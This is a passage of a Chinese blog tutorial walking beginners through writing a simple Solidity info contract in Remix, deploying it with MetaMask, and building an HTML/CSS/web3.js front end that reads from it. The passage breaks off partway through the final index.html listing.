    <link href="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/"/>
    <url>/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/</url>
    
    <content type="html"><![CDATA[<h1 id="实战-带你光速了解Dapp"><a href="#实战-带你光速了解Dapp" class="headerlink" title="实战-带你光速了解Dapp"></a>实战-带你光速了解Dapp</h1><blockquote><p>前言：跟着做就行</p></blockquote><h2 id="1-DApp实现之合约编写"><a href="#1-DApp实现之合约编写" class="headerlink" title="1.DApp实现之合约编写"></a>1.DApp实现之合约编写</h2><ul><li>打开<a href="https://remix.ethereum.org/">Remix编辑器</a></li><li>新建<code>InfoContract.sol</code>文件，并将下面合约内容Copy上去</li></ul><h3 id="编写InfoContract合约"><a href="#编写InfoContract合约" class="headerlink" title="编写InfoContract合约"></a>编写<code>InfoContract</code>合约</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: GPL-3.0<br><br>pragma solidity 0.8.0;<br><br>contract InfoContract&#123;<br>    string name;<br>    uint256 age;<br><br>    function setInfo(string memory _name,uint256 _age) public &#123;<br>        name = _name;<br>        age = _age;<br><br>    &#125;<br><br>    function getInfo() public view returns(string memory,uint)&#123;<br>        return (name,age);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-DApp实现之前端编写"><a href="#2-DApp实现之前端编写" class="headerlink" title="2.DApp实现之前端编写"></a>2.DApp实现之前端编写</h2><h3 id="2-1创建一个新文件夹Dapp"><a href="#2-1创建一个新文件夹Dapp" class="headerlink" title="2.1创建一个新文件夹Dapp"></a>2.1创建一个新文件夹<code>Dapp</code></h3><p>并用VScode或者Atom打开该文件夹（选择你自己使用的编辑器即可）</p><h3 id="2-2Dapp中创建index-html和index-css"><a href="#2-2Dapp中创建index-html和index-css" class="headerlink" title="2.2Dapp中创建index.html和index.css"></a>2.2<code>Dapp</code>中创建<code>index.html</code>和<code>index.css</code></h3><p><font color="red">index.html</font></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Dapp Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.css&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br>            First Dapp<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>姓名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>年龄：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><font color="blue">index.css</font></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#f0f0f0</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">2em</span>;<br>    <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&#x27;Raleway&#x27;</span>,<span class="hljs-string">&#x27;Source Sans Pro&#x27;</span>,<span class="hljs-string">&#x27;Arial&#x27;</span>;<br><br>&#125;<br><br><span class="hljs-selector-class">.container</span>&#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">40%</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;<br>&#125;<br><br><span class="hljs-selector-tag">label</span>&#123;<br>    <span class="hljs-attribute">display</span>: block;<br>    <span class="hljs-attribute">margin-bottom</span>:<span class="hljs-number">10px</span>;<br>&#125;<br><br><span class="hljs-selector-tag">input</span>&#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">50%</span>;<br>    <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">1em</span>;<br>&#125;<br><br><span class="hljs-selector-tag">button</span>&#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">2em</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">1em</span> <span class="hljs-number">4em</span>;<br>    <span class="hljs-attribute">display</span>: block;<br>&#125;<br><br><span class="hljs-selector-id">#info</span>&#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">1em</span>;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#fff</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">1em</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-3效果图预览"><a href="#2-3效果图预览" class="headerlink" title="2.3效果图预览"></a>2.3效果图预览</h3><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/%E6%95%88%E6%9E%9C%E5%9B%BE.png" alt="效果图"></p><h2 id="3-DApp实现之Web3与合约交互"><a href="#3-DApp实现之Web3与合约交互" class="headerlink" title="3. DApp实现之Web3与合约交互"></a>3. DApp实现之Web3与合约交互</h2><h3 id="3-1安装web3库"><a href="#3-1安装web3库" class="headerlink" title="3.1安装web3库"></a>3.1安装web3库</h3><blockquote><p>推荐使用第三种方法，因为不用安装任何环境</p></blockquote><h4 id="Node"><a href="#Node" class="headerlink" title="- Node"></a>- Node</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install web3<br></code></pre></td></tr></table></figure><h4 id="Yarn"><a href="#Yarn" class="headerlink" title="- Yarn"></a>- Yarn</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">yarn add web3<br></code></pre></td></tr></table></figure><h4 id="CDN"><a href="#CDN" class="headerlink" title="- CDN"></a>- CDN</h4><blockquote><p><font color="Red">由于以太坊舍弃了web3的脚本使用方法，所以这里我们临时使用替代脚本</font></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;!-- <span class="hljs-title class_">The</span> legacy-web3 script must run <span class="hljs-variable constant_">BEFORE</span> your other scripts. --&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://unpkg.com/@metamask/legacy-web3@latest/dist/metamask.web3.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>    &lt;!-- 或者用 --&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://unpkg.com/@metamask/legacy-web3@latest/dist/metamask.web3.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>Tip:</strong> 若web3难以安装，建议参考这篇文章<a href="https://blog.csdn.net/weixin_52628792/article/details/123866412">解决npm安装web3模块失败问题</a></p><h3 id="3-2-Web3调用合约"><a href="#3-2-Web3调用合约" class="headerlink" title="3.2 Web3调用合约"></a>3.2 Web3调用合约</h3><blockquote><p>参考文档：<a href="https://web3js.readthedocs.io/en/v1.7.4/web3-eth-contract.html#new-contract">web3.eth.contract</a></p></blockquote><h4 id="3-2-1获取合约的abi"><a href="#3-2-1获取合约的abi" class="headerlink" title="3.2.1获取合约的abi"></a>3.2.1获取合约的abi</h4><p><code>什么是abi？</code>可以去复习之前的课程</p><ul><li>回到Remix编辑器的编译器界面</li><li>点击右下角的<code>Compilation Details</code>按钮</li></ul><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/remix1.png" alt="remix1"></p><ul><li>复制abi内容</li></ul><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/abi.png" alt="abi"></p><h4 id="3-2-2部署合约"><a href="#3-2-2部署合约" class="headerlink" title="3.2.2部署合约"></a>3.2.2部署合约</h4><blockquote><p><font color="red">需要保证你的小狐狸钱包里有bnb余额</font></p></blockquote><ol><li>选择<code>Injected Web3</code>环境，点击<code>Deploy</code>部署</li></ol><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/deploy.png" alt="deploy"></p><ol start="2"><li>在小狐狸钱包中点击确认，交上部署合约的gas费</li></ol><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/mask.png" alt="mask" style="zoom:50%;"><ol start="3"><li>部署成功！</li></ol><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/success.png" alt="success"></p><ol start="4"><li>在左侧已部署合约中Copy合约地址</li></ol><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/copy.png" alt="copy"></p><p>我的合约地址是<code>0x528f48F5EbCbf25061e8814328A0073294ED58Cb</code></p><h4 id="3-2-3编写Script脚本"><a href="#3-2-3编写Script脚本" class="headerlink" title="3.2.3编写Script脚本"></a>3.2.3编写Script脚本</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    <br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(web3)<br>        web3.<span class="hljs-title function_">setProvider</span>(<span class="hljs-string">&#x27;ws://localhost:8545&#x27;</span>);<br>        <span class="hljs-comment">//获取介绍内容</span><br>        <span class="hljs-keyword">const</span> introduction = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;info&#x27;</span>)<br>       <br>         <span class="hljs-comment">//通过abi初始化合约</span><br>        <span class="hljs-keyword">var</span> infoContract = web3.<span class="hljs-property">eth</span>.<span class="hljs-title function_">contract</span>(<br>            [&#123;<br>                    <span class="hljs-string">&quot;inputs&quot;</span>: [],<br>                    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;getInfo&quot;</span>,<br>                    <span class="hljs-string">&quot;outputs&quot;</span>: [&#123;<br>                            <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>,<br>                            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;string&quot;</span><br>                        &#125;,<br>                        &#123;<br>                            <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span>,<br>                            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span><br>                        &#125;<br>                    ],<br>                    <span class="hljs-string">&quot;stateMutability&quot;</span>: <span class="hljs-string">&quot;view&quot;</span>,<br>                    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span><br>                &#125;,<br>                &#123;<br>                    <span class="hljs-string">&quot;inputs&quot;</span>: [&#123;<br>                            <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>,<br>                            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;_name&quot;</span>,<br>                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;string&quot;</span><br>                        &#125;,<br>                        &#123;<br>                            <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span>,<br>                            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;_age&quot;</span>,<br>                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span><br>                        &#125;<br>                    ],<br>                    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;setInfo&quot;</span>,<br>                    <span class="hljs-string">&quot;outputs&quot;</span>: [],<br>                    <span class="hljs-string">&quot;stateMutability&quot;</span>: <span class="hljs-string">&quot;nonpayable&quot;</span>,<br>                    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span><br>                &#125;<br>            ]<br>        );<br><br>        <span class="hljs-comment">//通过地址实例化合约</span><br>        <span class="hljs-keyword">var</span> info = infoContract.<span class="hljs-title function_">at</span>(<span class="hljs-string">&#x27;0x528f48F5EbCbf25061e8814328A0073294ED58Cb&#x27;</span>)<br><br>        <span class="hljs-comment">//从合约获取消息</span><br>        info.<span class="hljs-title function_">getInfo</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">error, result</span>) &#123;<br>            <span class="hljs-keyword">if</span> (!error) &#123;<br>                <span class="hljs-comment">//修改介绍内容</span><br>                introduction.<span class="hljs-property">innerHTML</span> = result[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;(&#x27;</span> + result[<span class="hljs-number">1</span>] + <span class="hljs-string">&#x27;years old)&#x27;</span><br>            &#125;<br>        &#125;)<br>      <br>        <br>    &lt;/script&gt;<br></code></pre></td></tr></table></figure><h4 id="3-2-4-更改合约信息"><a href="#3-2-4-更改合约信息" class="headerlink" title="3.2.4 更改合约信息"></a>3.2.4 更改合约信息</h4><p><strong>注意</strong>仍要在<code>injected web3</code>环境下更改，并且这将会收取一定的gas费用，小狐狸钱包上点击确认即可！</p><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/change.png" alt="change"></p><p><strong>更改成功！</strong></p><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/change_success.png" alt="change_success"></p><h4 id="3-2-5前端显示"><a href="#3-2-5前端显示" class="headerlink" title="3.2.5前端显示"></a>3.2.5前端显示</h4><p><img src="/2022/09/07/%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94%E5%85%89%E9%80%9F%E4%BA%86%E8%A7%A3DAPP/display1.png" alt="display1"></p><p><font color="red">恭喜你！至此你已经实现了人生中第一次与智能合约的交互！</font></p><h2 id="💎举一反三"><a href="#💎举一反三" class="headerlink" title="💎举一反三"></a>💎举一反三</h2><p>我们通过调用该合约的<code>getInfo()</code>的方法，获取了我们设置的信息，并让它在前端显示出来。那么该如何通过前端去更新我们智能合约的信息呢？</p><h3 id="index-html全部代码"><a href="#index-html全部代码" class="headerlink" title="index.html全部代码"></a><font color="red">index.html</font>全部代码</h3><blockquote><p>index.css无需改动，用之前的即可</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Dapp Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.css&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://unpkg.com/@metamask/legacy-web3@latest/dist/metamask.web3.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br>            First Dapp<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>姓名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>年龄：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;age&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>更新<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(web3)</span><br><span class="language-javascript">        web3.<span class="hljs-title function_">setProvider</span>(<span class="hljs-string">&#x27;ws://localhost:8545&#x27;</span>);</span><br><span class="language-javascript">        <span class="hljs-comment">//获取介绍内容</span></span><br><span class="language-javascript">        <span class="hljs-keyword">const</span> introduction = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;info&#x27;</span>) </span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-comment">//通过abi初始化合约</span></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> infoContract = web3.<span class="hljs-property">eth</span>.<span class="hljs-title function_">contract</span>(</span><br><span class="language-javascript">            [&#123;</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;inputs&quot;</span>: [],</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;getInfo&quot;</span>,</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;outputs&quot;</span>: [&#123;</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>,</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;string&quot;</span></span><br><span class="language-javascript">                        &#125;,</span><br><span class="language-javascript">                        &#123;</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span>,</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span></span><br><span class="language-javascript">                        &#125;</span><br><span class="language-javascript">                    ],</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;stateMutability&quot;</span>: <span class="hljs-string">&quot;view&quot;</span>,</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span></span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                &#123;</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;inputs&quot;</span>: [&#123;</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;string&quot;</span>,</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;_name&quot;</span>,</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;string&quot;</span></span><br><span class="language-javascript">                        &#125;,</span><br><span class="language-javascript">                        &#123;</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;internalType&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span>,</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;_age&quot;</span>,</span><br><span class="language-javascript">                            <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;uint256&quot;</span></span><br><span class="language-javascript">                        &#125;</span><br><span class="language-javascript">                    ],</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;setInfo&quot;</span>,</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;outputs&quot;</span>: [],</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;stateMutability&quot;</span>: <span class="hljs-string">&quot;nonpayable&quot;</span>,</span><br><span class="language-javascript">                    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;function&quot;</span></span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            ]</span><br><span class="language-javascript">        );</span><br><span class="language-javascript">        </span><br><span class="language-javascript">        <span class="hljs-comment">//通过地址实例化合约</span></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> info = infoContract.<span class="hljs-title function_">at</span>(<span class="hljs-string">&#x27;0x528f48F5EbCbf25061e8814328A0073294ED58Cb&#x27;</span>)</span><br><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-comment">//从合约获取消息</span></span><br><span class="language-javascript">        info.<span class="hljs-title function_">getInfo</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">error, result</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">if</span> (!error) &#123;</span><br><span class="language-javascript">                <span class="hljs-comment">//修改介绍内容</span></span><br><span class="language-javascript">                introduction.<span class="hljs-property">innerHTML</span> = result[<span 